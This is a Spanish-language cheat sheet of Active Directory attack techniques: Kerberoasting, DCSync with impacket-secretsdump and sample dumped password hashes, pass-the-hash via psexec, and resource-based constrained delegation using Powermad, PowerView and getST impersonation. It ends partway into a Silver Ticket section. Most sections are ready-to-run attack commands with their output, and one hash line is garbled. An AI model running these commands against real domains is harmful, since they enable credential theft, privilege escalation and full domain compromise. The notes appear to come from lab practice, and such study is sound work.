---- 
## Kerberoasting Attack:

##### Al tener credenciales validas, podriamos efectuar un kerberoasting attack:

```shell
GetUserSPNs.py {dc}/{user}:{passwd}
# En caso de que esto tirase error, por ejemplo por estar desactivada el registro NTLM:
GetUserSPNs.py {dc}/{user}:{passwd} -k -debug
# -k tirar de kerberos, -debug --> ver errores 
# Podriamos buscar el error que nos arroja la consola, y ver que habria que modificar el script de GetUsersSPNs.py
# Linea 260 aprox, en funcion run: 
# new line ---> target = self.__kdcHost
# old line --> #target = self.getMachineName()  <-- old line 260 code that we're no longer running
impacket-GetUserSPNs {dc}/{user}:{passwd} -k -debug -dc-ip {target_ip} -dc-host {dc}
# De esta manera nos devolveria un SPN --> (Service Principal Name: esto esta asociado a un objeto de ad (cuenta de user, group o pc) en el cual el servicio se ejecuta)

```

---

## DCSync attack:

##### Permite al atacante simular el comportamiento del Domain Controller 
##### ( #DC ) y recuperar datos de conraseñas a través de replicación de domino. 

### Proceso: 

- ##### El atacante descubre el domain controller para solicitar la replicación.
- ##### El atacante solicita la replicación de usuarios mediante #GetNCChangesolic 
- ##### El DC retorna la respuesta, inluyendo los hashes de las contraseñas de los usuarios. 

##### Muchas veces la infraestructura de las organizaciones necesita más de un #DC, para el #AD. Para mantener la choerencia de un entorno con más de un DC , es necesario que los objetos de AD se repliquen a través de esos DC. 
##### La mayoria de las tareas relacionadas con la replicación se especifican en el Protocolo remoto de Serivico de replicación de directorios. 

## Explotación 

##### Cuando un usuario posee los permisos de GetChanges y GetChangesAll podrá realizar una replicación de dominio, de esta manera podemos usar herramientas como impacket para obtener los hashes de las contraseñas de los usuarios...

```shell
impacket-secretsdump {domain}/{user}@{target_ip}

# Ejemplo 
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/userx@10.10.10.175
# Esto realizara la replicación y nos arrojara algo como lo siguiente: 
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ffjava802229e466e2c:::
# En donde podemos ver los hashes de las contraseñas de los usuarios, por ejemplo, el hash de la password de el usuario Administrator es "823452073d75b9d1cf70ebdf86c7f98e", 
```

##### Teniendo el hash de la contraseña del usuario, podemos utlizar la herramienta "impacket-psexec" (Herramienta de línea de comandos que permite a los admins de sistemas ejecutar comandos), para solicitar un consola interactiva:

```shell
impacket-psexec {domain}/{user}@{target_ip} cmd.exe --hashes :{hash}
# Esto nos arrojaria una consola interactiva con permisos de administrador

# Ejemplo 
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe --hashes :823452073d75b9d1cf70ebdf86c7f98e

```

---

## Resource-based Constraint Delegation:

##### El Resource-based Constraint Delegation establece en el objeto quién puede suplantar a cualquier usuario en su contra.
##### En este caso, el objeto restringido tendrá un atributo llamado msDS-AllowedToActOnBehalfOfOtherIdentity con el nombre del usuario que puede suplantar a cualquier otro usuario en su contra.
###### Otra diferencia importante de esta Delegación restringida a las otras delegaciones es que cualquier usuario con permisos de escritura sobre una cuenta de máquina (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) puede configurar el msDS-AllowedToActOnBehalfOfOtherIdentity (En las otras formas de Delegación necesitaba administrador de dominio privs).

- ##### El atacante compromete una cuenta que tiene un SPN o crea uno ("Servicio A"). Tenga en cuenta que cualquier usuario administrador sin ningún otro privilegio especial puede crear hasta 10 objetos de equipo (MachineAccountQuota) y establecerles un SPN. Entonces, el atacante puede simplemente crear un objeto de computadora y establecer un SPN.
- ##### El atacante abusa de su privilegio de ESCRITURA sobre la computadora víctima (ServiceB) para configurar la delegación restringida basada en recursos para permitir que ServiceA suplante a cualquier usuario contra esa computadora víctima (ServiceB).
- ##### El atacante usa Rubeus (U otras maneras de explotar y realizar el ataque) para realizar un ataque S4U completo (S4U2Self y S4U2Proxy) del Servicio A al Servicio B para un usuario con acceso privilegiado al Servicio B.
	- ##### S4U2Self (de la cuenta SPN comprometida/creada): Solicite un TGS de administrador para mí (no reenviable).
	- ##### S4U2Proxy: use el TGS no reenviable del paso anterior para solicitar un TGS del administrador al host de la víctima.
	- ##### Incluso si está utilizando un TGS no reenviable, ya que está explotando la delegación restringida basada en recursos, funcionará.
- ##### El atacante puede pasar el ticket y hacerse pasar por el usuario para obtener acceso al ServiceB de la víctima.

### Explotación:

##### Así como se puede explotar con Rubeus, existen otras maneras, desde el script rbcd.py encontrado en github https://github.com/tothi/rbcd-attack, así como tambien usando las herramientas de impacket:

##### Lo primero que deberiamos hacer es crear el Computer Objetc, para esto usaremos powermad (Se recomienda tambien usar powerview)
- ##### Powermad: (wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1) 
- ##### Powerview: (wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
##### Ambos deberian transferirise a la maquina victima windows que tenemos pwneada, una vez en ella:

```powershell 
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1
New-MachineAccount -MachineAccount {evilPC_name} -Password $(ConvertTo-SecureString '{evilPC_passwd}' -AsPlainText -Force) -Verbose
```

##### Una vez creada la maquina, podriamos (haciendo uso de powerview) ver si esta se creo correctamente: 

```powershell
Get-DomainComputer {evilPC_name}
```

#### Luego, haciendo uso de powerview declaramos algunas variables para realizar el ataque: 

```powershell
$targetComputer = {taget_Computer}

$ComputerSid = Get-DomainComputer {evilPC_name} -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Adicionalmente, una vez más, haciendo uso de powerview podriamos corroborar que todo haya salido ok, ejecutando: 

Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

# Lo que deberia arrojar: 
# msds-allowedtoactonbehalfofotheridentity

# ----------------------------------------

# {1, 0, 4, 128...}
```

#####  De esta manera habriamos realizado todo, solo quedaria solicitar un TGT a #KERBEROS para suplantar la identidad del usuario que deseemos. 
##### En nuestra maquina atacante con linux: 

```shell
impacket-getST -spn cifs/{dc} -impersonate {user_to_supplant} -dc-ip {dc_ip} {dc}/{evilPC_name}$:{evilPC_password}
```

##### De esta manera habriamos solicitado y conseguido el TGT para el usuario que desearamos, por lo que simplemente quedaria exportart la variable global KRB5CCNAME, y utilizar psexec para autenticarnos como el usuario suplantado: 

```shell
export KRB5CCNAME=$(pwd)/{user_to_supplant}.ccahe

impacket-psexec -k {dc}
```

---

## Silver Ticket Attack: 

#### Esto suele ser muy raro, pero posible, y consiste en cuando poseemos credenciales validas de un usuario con SPN (Service Principal Name), es decir, un usuario que corre un servicio en particular, como myqsl, así como a su vez tenemos el hash NTLM (Que con tener la passwd se puede generar), asi como el SID del dominio.

